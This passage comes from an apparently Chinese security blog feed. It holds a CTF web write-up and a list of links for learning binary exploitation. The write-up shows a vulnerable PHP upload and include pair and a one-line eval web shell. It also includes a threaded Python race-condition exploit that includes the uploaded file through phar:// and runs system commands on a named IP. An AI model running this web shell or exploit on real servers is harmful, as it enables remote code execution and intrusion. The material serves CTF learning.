class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$error=$_FILES[<span class="string">'pic'</span>][<span class="string">'error'</span>];</div><div class="line">$tmpName=$_FILES[<span class="string">'pic'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">$name=$_FILES[<span class="string">'pic'</span>][<span class="string">'name'</span>];</div><div class="line">$size=$_FILES[<span class="string">'pic'</span>][<span class="string">'size'</span>];</div><div class="line">$type=$_FILES[<span class="string">'pic'</span>][<span class="string">'type'</span>];</div><div class="line"><span class="keyword">try</span>&#123;</div><div class="line">	<span class="keyword">if</span>($name!==<span class="string">""</span>)</div><div class="line">	&#123;</div><div class="line">		$name1=substr($name,<span class="number">-4</span>);</div><div class="line">		<span class="keyword">if</span>(($name1!==<span class="string">".gif"</span>) <span class="keyword">and</span> ($name1!==<span class="string">".jpg"</span>))</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">echo</span> <span class="string">"hehe"</span>;</div><div class="line">			<span class="keyword">echo</span> <span class="string">"&lt;script language=javascript&gt;alert('不允许的文件类型！');history.go(-1)&lt;/script&gt;"</span>;</div><div class="line">			<span class="keyword">exit</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span>($type!==<span class="string">"image/jpeg"</span>&amp;&amp;$type!==<span class="string">"image/gif"</span>)</div><div class="line">		&#123;</div><div class="line">			<span class="comment">//echo mime_content_type($tmpName);</span></div><div class="line">			<span class="keyword">echo</span> <span class="string">"&lt;script language=javascript&gt;alert('不允许的文件类型！');history.go(-1)&lt;/script&gt;"</span>;</div><div class="line">			<span class="keyword">exit</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span>(is_uploaded_file($tmpName))&#123;</div><div class="line">			$time=time();</div><div class="line">			$rootpath=<span class="string">'uploads/'</span>.$time.$name1;</div><div class="line">			<span class="keyword">if</span>(!move_uploaded_file($tmpName,$rootpath))&#123;</div><div class="line">				<span class="keyword">echo</span> <span class="string">"&lt;script language='JavaScript'&gt;alert('文件移动失败!');window.location='index.php?page=submit'&lt;/script&gt;"</span>;</div><div class="line">				<span class="keyword">exit</span>;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">else</span>&#123;</div><div class="line">				sleep(<span class="number">2</span>);				</div><div class="line">				<span class="keyword">if</span> ($type==<span class="string">'image/jpeg'</span>)</div><div class="line">				&#123;</div><div class="line">					$im = @imagecreatefromjpeg($rootpath);</div><div class="line">					<span class="keyword">if</span>(!$im)&#123;</div><div class="line">					  $im = imagecreatetruecolor(<span class="number">150</span>, <span class="number">30</span>);</div><div class="line">					  $bg = imagecolorallocate($im, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</div><div class="line">					  $text_color = imagecolorallocate($im, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>);</div><div class="line">					  imagefilledrectangle($im, <span class="number">0</span>, <span class="number">0</span>, <span class="number">150</span>, <span class="number">30</span>, $bg);</div><div class="line">					  imagestring($im, <span class="number">3</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="string">"Error loading image"</span>, $text_color);</div><div class="line">					&#125; <span class="keyword">else</span> &#123;</div><div class="line">						$time=time();</div><div class="line">						$new_rootpath=<span class="string">'uploads/'</span>.$time.$name1;</div><div class="line">						imagejpeg($im,$new_rootpath);</div><div class="line">						imagedestroy($im);</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">				<span class="keyword">else</span> <span class="keyword">if</span> ($type==<span class="string">'image/gif'</span>)</div><div class="line">				&#123;</div><div class="line">					$im = @imagecreatefromgif($rootpath);</div><div class="line">					<span class="keyword">if</span>(!$im)&#123;</div><div class="line">					  $im = imagecreatetruecolor(<span class="number">150</span>, <span class="number">30</span>);</div><div class="line">					  $bg = imagecolorallocate($im, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</div><div class="line">					  $text_color = imagecolorallocate($im, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>);</div><div class="line">					  imagefilledrectangle($im, <span class="number">0</span>, <span class="number">0</span>, <span class="number">150</span>, <span class="number">30</span>, $bg);</div><div class="line">					  imagestring($im, <span class="number">3</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="string">"Error loading image"</span>, $text_color);</div><div class="line">					&#125; <span class="keyword">else</span> &#123;</div><div class="line">						$time=time();</div><div class="line">						$new_rootpath=<span class="string">'uploads/'</span>.$time.$name1;</div><div class="line">						imagegif($im,$new_rootpath);</div><div class="line">						imagedestroy($im);</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">				unlink($rootpath);</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"图片ID："</span>.$time;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"ERROR"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>index.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">require</span>(<span class="string">"header.php"</span>);</div><div class="line">	$page=<span class="string">""</span>;</div><div class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>]))</div><div class="line">	&#123;</div><div class="line">		$page=strtolower($_GET[<span class="string">'page'</span>]);</div><div class="line">		$page=str_replace(<span class="string">"#"</span>, <span class="string">""</span>, $page);</div><div class="line">		$page=str_replace(<span class="string">"'"</span>, <span class="string">""</span>, $page);</div><div class="line">		$page=$page.<span class="string">".php"</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span></div><div class="line">		$page=<span class="string">"main.php"</span>;</div><div class="line">	<span class="keyword">include</span>($page);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>在upload.php中，它先将我们上传的文件保存到uploads文件夹下，然后sleep(2)，接着调用imagecreatefromgif等一系列操作。如果我们上传一个包含php代码的图片木马，在经过imagecreatefromgif等一系列操作后，正常情况下其中的php代码会被去掉，也就是说操作过后的图片已经不是图片木马了。不过由于存在sleep(2)，可以利用这个两秒的空隙，利用phar或者zip协议去包含我们上传的还未被删除的图片木马。</p>
<p>基本的流程如下。<br>首先有个k.php，内容如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php @eval($_POST[&apos;test&apos;]) ?&gt;</div></pre></td></tr></table></figure></p>
<p>将它压缩为zip文件，文件名为k.zip。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/1.png?raw=true" alt=""></p>
<p>然后上传时将其文件名改为k.jpg，类型改为image/jpeg。在上传后访问<code>http://202.112.51.217:8199/uploads/</code>，去获取最新的文件名，然后用协议去包含。如果手动的话时间肯定会超过2s，所以需要用脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">s = requests.session()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">uploadfile</span><span class="params">()</span>:</span></div><div class="line">    url = <span class="string">'http://202.112.51.217:8199/upload.php'</span></div><div class="line">    data = &#123;<span class="string">'title'</span>:<span class="string">'1'</span>,<span class="string">'url'</span>:<span class="string">'1'</span>&#125;</div><div class="line">    files = &#123;<span class="string">'pic'</span>: (<span class="string">'k.jpg'</span>, open(<span class="string">'k.zip'</span>, <span class="string">'rb'</span>), <span class="string">'image/jpeg'</span>, &#123;<span class="string">'Expires'</span>: <span class="string">'0'</span>&#125;)&#125;</div><div class="line">    html = s.post(url,files=files)</div><div class="line"></div><div class="line">// get the latest filename</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilename</span><span class="params">()</span>:</span></div><div class="line">    url = <span class="string">'http://202.112.51.217:8199/uploads/'</span></div><div class="line">    content = s.get(url).content</div><div class="line">    reg = <span class="string">r'href="(.+?\.jpg)"'</span></div><div class="line">    imgre = re.compile(reg)</div><div class="line">    imglist = re.findall(imgre,content)</div><div class="line">    <span class="keyword">return</span> imglist[::<span class="number">-1</span>]      </div><div class="line"></div><div class="line">// use phar getshell</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getshell</span><span class="params">()</span>:</span></div><div class="line">	filename = getfilename()</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> filename:</div><div class="line">	    url = <span class="string">'http://202.112.51.217:8199/index.php?page=phar://uploads/'</span> + i +<span class="string">'/k'</span></div><div class="line">	    data = &#123;<span class="string">'test'</span>:<span class="string">'system("ls");'</span>&#125;</div><div class="line">	    content = s.post(url,data=data).content</div><div class="line">	    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> content:</div><div class="line">	        <span class="keyword">print</span> content</div><div class="line">	        exit()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">    t1 = threading.Thread(target=uploadfile)</div><div class="line">    t2 = threading.Thread(target=getshell)</div><div class="line">    t1.start()</div><div class="line">    t2.start()</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/2.png?raw=true" alt=""></p>
<p>之后将getshell里的改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">data = &#123;&apos;test&apos;:&apos;system(&quot;cat xxxxxxxxxasdasf_flag.php&quot;);&apos;&#125;</div><div class="line">content = s.post(url,data=data).content</div><div class="line">if &apos;&#123;&apos; in content:</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/3.png?raw=true" alt=""></p>
<p>因为index.php中对<code>#</code>进行了过滤，所以zip协议用不了。因为zip协议的利用要如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:8199/index.php?page=phar://uploads/filename.jpg#k</div></pre></td></tr></table></figure></p>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html" target="_blank" rel="external">zip或phar协议包含文件</a></li>
<li><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="external">文件包含漏洞小结</a></li>
<li><a href="http://4o4notfound.org/index.php/archives/31/" target="_blank" rel="external">PHP伪协议分析与应用</a></li>
<li><a href="http://www.freebuf.com/articles/web/54086.html" target="_blank" rel="external">挖洞姿势：特殊的上传技巧，绕过PHP图片转换实现远程代码执行（RCE） </a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文件上传、php伪协议、文件包含&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Software-Security-Learning</title>
    <link href="http://yoursite.com/2017/08/19/Software-Security-Learning/"/>
    <id>http://yoursite.com/2017/08/19/Software-Security-Learning/</id>
    <published>2017-08-19T02:16:10.000Z</published>
    <updated>2017-08-22T14:34:23.543Z</updated>
    
    <content type="html"><![CDATA[<p>Software-Security-Learning 学习资料<br>8月22日更新小记：</p>
<ul>
<li>IOS板块增加: <a href="https://github.com/pandazheng/IosHackStudy" target="_blank" rel="external">IosHackStudy</a></li>
<li>堆相关知识增加： <a href="http://0x48.pw/2017/08/07/0x37/" target="_blank" rel="external">malloc.c源码阅读之__libc_free</a></li>
</ul>
<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><h1 id="Bin-Securiy"><a href="#Bin-Securiy" class="headerlink" title="Bin Securiy"></a>Bin Securiy</h1><ul>
<li><a href="https://github.com/feicong/sec_skills" target="_blank" rel="external">软件安全工程师技能表</a></li>
</ul>
<h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><ul>
<li><a href="https://github.com/angr/angr" target="_blank" rel="external">Angr：The next-generation binary analysis platform </a></li>
<li><a href="http://www.freebuf.com/sectool/143056.html" target="_blank" rel="external">Angr：一个具有动态符号执行和静态分析的二进制分析工具 </a></li>
<li><a href="http://bestwing.me/2017/03/08/angr-study/" target="_blank" rel="external">angr初探</a></li>
</ul>
<ul>
<li><a href="http://www.freebuf.com/sectool/143123.html" target="_blank" rel="external">Vuzzer自动漏洞挖掘工具简单分析附使用介绍</a></li>
</ul>
<ul>
<li><a href="https://github.com/longld/peda" target="_blank" rel="external">PEDA - Python Exploit Development Assistance for GDB</a></li>
<li><a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="external">pwntools - CTF framework and exploit development library</a></li>
</ul>
<h2 id="Course"><a href="#Course" class="headerlink" title="Course"></a>Course</h2><ul>
<li><a href="http://security.cs.rpi.edu/courses/binexp-spring2015/" target="_blank" rel="external">Modern Binary Exploitation</a></li>
<li><a href="https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/" target="_blank" rel="external">Linux (x86) Exploit Development Series</a></li>
<li><a href="http://liveoverflow.com/binary_hacking/index.html" target="_blank" rel="external">liveoverflow: Binary Hacking Course</a></li>
<li><a href="https://www.fuzzysecurity.com/tutorials.html" target="_blank" rel="external">Lots of Tutorials</a></li>
</ul>
<h3 id="Hack-The-Virtual-Memory"><a href="#Hack-The-Virtual-Memory" class="headerlink" title="Hack The Virtual Memory"></a>Hack The Virtual Memory</h3><ul>
<li><a href="https://blog.holbertonschool.com/hack-the-virtual-memory-c-strings-proc/" target="_blank" rel="external">Hack The Virtual Memory: C strings &amp; /proc</a></li>
<li><a href="https://blog.holbertonschool.com/hack-the-virtual-memory-python-bytes/" target="_blank" rel="external">Hack The Virtual Memory: Python bytes</a></li>
<li><a href="https://blog.holbertonschool.com/hack-the-virtual-memory-drawing-the-vm-diagram/" target="_blank" rel="external">Hack the Virtual Memory: drawing the VM diagram</a></li>
<li><a href="https://blog.holbertonschool.com/hack-the-virtual-memory-malloc-the-heap-the-program-break/" target="_blank" rel="external">Hack the Virtual Memory: malloc, the heap &amp; the program break</a></li>
</ul>
<h3 id="Exploit-writing-tutorial"><a href="#Exploit-writing-tutorial" class="headerlink" title="Exploit writing tutorial"></a>Exploit writing tutorial</h3><ul>
<li><a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" target="_blank" rel="external">Stack Based Overflows</a></li>
<li><a href="https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/" target="_blank" rel="external">Stack Based Overflows – jumping to shellcode</a></li>
<li><a href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/" target="_blank" rel="external">SEH Based Exploits</a></li>
<li><a href="https://www.corelan.be/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b/" target="_blank" rel="external">SEH Based Exploits – just another example</a></li>
<li><a href="https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/" target="_blank" rel="external">From Exploit to Metasploit – The basics</a></li>
<li><a href="https://www.corelan.be/index.php/2009/09/05/exploit-writing-tutorial-part-5-how-debugger-modules-plugins-can-speed-up-basic-exploit-development/" target="_blank" rel="external">How debugger modules &amp; plugins can speed up basic exploit development</a></li>
<li><a href="https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/" target="_blank" rel="external">Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR</a></li>
<li><a href="https://www.corelan.be/index.php/2009/11/06/exploit-writing-tutorial-part-7-unicode-from-0x00410041-to-calc/" target="_blank" rel="external">Unicode – from 0x00410041 to calc</a></li>
<li><a href="https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/" target="_blank" rel="external">Win32 Egg Hunting</a></li>
<li><a href="https://www.corelan.be/index.php/2010/02/25/exploit-writing-tutorial-part-9-introduction-to-win32-shellcoding/" target="_blank" rel="external">Introduction to Win32 shellcoding</a></li>
<li><a href="https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/" target="_blank" rel="external">Chaining DEP with ROP</a></li>
<li><a href="https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/" target="_blank" rel="external">Heap Spraying Demystified</a></li>
</ul>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ul>
<li><a href="http://www.freebuf.com/articles/system/135685.html" target="_blank" rel="external">Linux中的GOT和PLT到底是个啥？ </a></li>
<li><a href="https://github.com/enzet/symbolic-execution" target="_blank" rel="external">关于符号执行</a></li>
</ul>
<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="一步一步ROP"><a href="#一步一步ROP" class="headerlink" title="一步一步ROP"></a>一步一步ROP</h3><ul>
<li><a href="http://cb.drops.wiki/drops/tips-6597.html" target="_blank" rel="external">一步一步学ROP之linux_x86篇</a></li>
<li><a href="http://cb.drops.wiki/drops/papers-7551.html" target="_blank" rel="external">一步一步学ROP之linux_x86篇</a></li>
<li><a href="http://cb.drops.wiki/drops/binary-10638.html" target="_blank" rel="external">一步一步学ROP之gadgets和2free篇</a></li>
<li><a href="http://cb.drops.wiki/drops/papers-11390.html" target="_blank" rel="external">一步一步学ROP之Android ARM 32位篇</a></li>
</ul>
<h3 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h3><ul>
<li><a href="https://blog.skullsecurity.org/2013/ropasaurusrex-a-primer-on-return-oriented-programming" target="_blank" rel="external">ropasaurusrex: a primer on return-oriented programming2</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3569.html" target="_blank" rel="external">ROP技术入门教程</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/840.html?fpage=2" target="_blank" rel="external">二进制漏洞利用中的ROP技术研究与实例分析</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3694.html" target="_blank" rel="external">现代栈溢出利用技术基础：ROP</a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/binary-14360.html" target="_blank" rel="external">通过ELF动态装载构造ROP链</a></li>
<li><a href="http://bestwing.me/2017/03/19/stack-overflow-two-ROP/" target="_blank" rel="external">Swing: 基础栈溢出复习 二 之 ROP </a></li>
</ul>
<h3 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h3><ul>
<li><a href="https://raw.githubusercontent.com/phith0n/Mind-Map/master/渗透测试.png" target="_blank" rel="external">Blind Return Oriented Programming</a></li>
</ul>
<ul>
<li><a href="http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/" target="_blank" rel="external">muhe: Have fun with Blind ROP</a></li>
</ul>
<ul>
<li><a href="http://bestwing.me/2017/03/24/stack-overflow-four-BROP/" target="_blank" rel="external">Swing: 基础栈溢出复习 四 之 BROP </a></li>
</ul>
<h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><ul>
<li><a href="http://www.freebuf.com/articles/network/87447.html" target="_blank" rel="external">Sigreturn Oriented Programming (SROP) Attack攻击原理</a></li>
<li><a href="http://bestwing.me/2017/03/20/stack-overflow-three-SROP/" target="_blank" rel="external">Swing: 基础栈溢出复习 三 之 SROP </a></li>
</ul>
<h3 id="Return-to-dl-resolve"><a href="#Return-to-dl-resolve" class="headerlink" title="Return-to-dl-resolve"></a>Return-to-dl-resolve</h3><ul>
<li><a href="http://www.evil0x.com/posts/19226.html" target="_blank" rel="external">通过ELF动态装载构造ROP链 （ Return-to-dl-resolve）</a></li>
</ul>
<h2 id="栈漏洞"><a href="#栈漏洞" class="headerlink" title="栈漏洞"></a>栈漏洞</h2><ul>
<li><a href="http://bobao.360.cn/learning/detail/3717.html" target="_blank" rel="external">手把手教你栈溢出从入门到放弃（上）</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3718.html" target="_blank" rel="external">手把手教你栈溢出从入门到放弃（下）</a></li>
<li><a href="http://0x48.pw/2016/11/03/0x26/" target="_blank" rel="external">Hcamael: PWN学习总结之基础栈溢出</a></li>
<li><a href="http://0x48.pw/2016/11/21/0x27/" target="_blank" rel="external">Hcamael: PWN学习总结之基础栈溢出2 </a></li>
<li><a href="http://bestwing.me/2017/03/18/stack-overflow-one/" target="_blank" rel="external">Swing: 基础栈溢出复习 之基础</a></li>
<li><a href="http://www.freebuf.com/articles/terminal/107276.html" target="_blank" rel="external">ARM栈溢出攻击实践：从虚拟环境搭建到ROP利用 </a></li>
<li><a href="https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/" target="_blank" rel="external">64-bit Linux stack smashing tutorial: Part 1</a></li>
<li><a href="https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/" target="_blank" rel="external">64-bit Linux stack smashing tutorial: Part 2</a></li>
<li><a href="https://blog.techorganic.com/2016/03/18/64-bit-linux-stack-smashing-tutorial-part-3/" target="_blank" rel="external">64-bit Linux stack smashing tutorial: Part 3</a></li>
<li><a href="http://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html" target="_blank" rel="external">Offset2lib: bypassing full ASLR on 64bit Linu</a></li>
</ul>
<h2 id="堆漏洞"><a href="#堆漏洞" class="headerlink" title="堆漏洞"></a>堆漏洞</h2><ul>
<li><a href="https://heap-exploitation.dhavalkapil.com/introduction.html" target="_blank" rel="external">Heap Exploitation</a></li>
<li><a href="https://github.com/shellphish/" target="_blank" rel="external">how2heap</a></li>
</ul>
<h3 id="堆相关知识"><a href="#堆相关知识" class="headerlink" title="堆相关知识"></a>堆相关知识</h3><ul>
<li><a href="http://paper.seebug.org/255/" target="_blank" rel="external">PWN之堆内存管理</a></li>
<li><a href="http://www.freebuf.com/articles/system/104144.html" target="_blank" rel="external">Linux堆内存管理深入分析（上） </a></li>
<li><a href="http://www.freebuf.com/articles/security-management/105285.html" target="_blank" rel="external">Linux堆内存管理深入分析（下） </a></li>
<li><a href="http://bobao.360.cn/learning/detail/3548.html" target="_blank" rel="external">Windows Exploit开发系列教程——堆喷射（一）</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3555.html" target="_blank" rel="external">Windows Exploit开发系列教程——堆喷射（二）</a></li>
<li><a href="http://www.freebuf.com/articles/system/91527.html" target="_blank" rel="external">Libc堆管理机制及漏洞利用技术 (一） </a></li>
<li><a href="https://blog.iret.xyz/article.aspx/linux_heapoverflow_enterance" target="_blank" rel="external">Notes About Heap Overflow Under Linux</a></li>
<li><a href="http://www.freebuf.com/vuls/98404.html" target="_blank" rel="external">如何理解堆和堆溢出漏洞的利用?</a></li>
</ul>
<ul>
<li><a href="http://o0xmuhe.me/2016/11/21/Have-fun-with-glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" target="_blank" rel="external">Have fun with glibc内存管理</a></li>
<li><a href="http://www.tuicool.com/articles/A7n2ueq" target="_blank" rel="external">内存映射mmap</a></li>
<li><a href="http://0x48.pw/2017/07/25/0x35/" target="_blank" rel="external">glibc malloc学习笔记之fastbin</a></li>
<li><a href="http://0x48.pw/2017/08/07/0x37/" target="_blank" rel="external">malloc.c源码阅读之__libc_free</a></li>
</ul>
<h3 id="堆利用技术"><a href="#堆利用技术" class="headerlink" title="堆利用技术"></a>堆利用技术</h3><ul>
<li><a href="http://wooyun.jozxing.cc/static/drops/binary-14596.html" target="_blank" rel="external">溢出科普：heap overflow&amp;溢出保护和绕过</a></li>
</ul>
<ul>
<li><a href="http://bobao.360.cn/learning/detail/3197.html" target="_blank" rel="external">现代化的堆相关漏洞利用技巧</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3113.html" target="_blank" rel="external">从一字节溢出到任意代码执行-Linux下堆漏洞利用</a></li>
<li><a href="https://sploitfun.wordpress.com/2015/02/26/heap-overflow-using-unlink/?spm=a313e.7916648.0.0.x4nzYZ" target="_blank" rel="external">Heap overflow using unlink</a></li>
<li><a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916646.24000001.74.ZP8rXN&amp;articleid=360" target="_blank" rel="external">Linux堆溢出漏洞利用之unlink</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3996.html" target="_blank" rel="external">Linux堆溢出之Fastbin Attack实例详解</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3296.html" target="_blank" rel="external">unsorted bin attack分析</a></li>
<li><a href="http://www.vuln.cn/6172" target="_blank" rel="external">Double Free浅析</a></li>
<li><a href="http://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf" target="_blank" rel="external">Understanding the heap by breaking it</a></li>
<li><a href="https://www.purehacking.com/blog/lloyd-simon/an-introduction-to-use-after-free-vulnerabilities" target="_blank" rel="external">An Introduction to Use After Free Vulnerabilities</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3379.html?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="external">Use After Free漏洞浅析</a></li>
<li><a href="http://d0m021ng.github.io/2017/03/04/PWN/Linux堆漏洞之Use-after-free实例/" target="_blank" rel="external">Linux堆漏洞之Use after free实例</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3417.html" target="_blank" rel="external">堆之House of Spirit</a></li>
</ul>
<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><ul>
<li><a href="https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf" target="_blank" rel="external">Exploiting Format String Vulnerabilities</a></li>
</ul>
<ul>
<li><a href="http://cb.drops.wiki/drops/binary-6259.html" target="_blank" rel="external">二进制漏洞之——邪恶的printf</a></li>
<li><a href="http://cb.drops.wiki/drops/papers-9426.html" target="_blank" rel="external">漏洞挖掘基础之格式化字符串</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3654.html" target="_blank" rel="external">格式化字符串漏洞利用小结（一）</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3674.html" target="_blank" rel="external">格式化字符串漏洞利用小结（二）</a></li>
<li><a href="http://www.cnblogs.com/Ox9A82/p/5429099.html" target="_blank" rel="external">Linux下的格式化字符串漏洞利用姿势</a></li>
</ul>
<ul>
<li><a href="http://0x48.pw/2017/03/13/0x2c/?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="external">Linux系统下格式化字符串利用研究 </a></li>
</ul>
<ul>
<li><a href="https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf" target="_blank" rel="external">Exploiting Format String Vulnerabilities</a></li>
</ul>
<ul>
<li><a href="http://phrack.org/issues/59/7.html" target="_blank" rel="external">Advances in format string exploitation</a></li>
<li><a href="http://www.vnsecurity.net/research/2012/02/16/exploiting-sudo-format-string-vunerability.html" target="_blank" rel="external">Exploiting Sudo format string vunerability</a></li>
</ul>
<h2 id="其余漏洞"><a href="#其余漏洞" class="headerlink" title="其余漏洞"></a>其余漏洞</h2><h3 id="FSP溢出"><a href="#FSP溢出" class="headerlink" title="FSP溢出"></a>FSP溢出</h3><ul>
<li><a href="http://wooyun.jozxing.cc/static/drops/binary-12740.html" target="_blank" rel="external">Head First FILE Stream Pointer Overflow</a></li>
<li><a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/" target="_blank" rel="external">abusing the FILE structure</a></li>
<li><a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/" target="_blank" rel="external">File Stream Pointer Overflows Paper.</a></li>
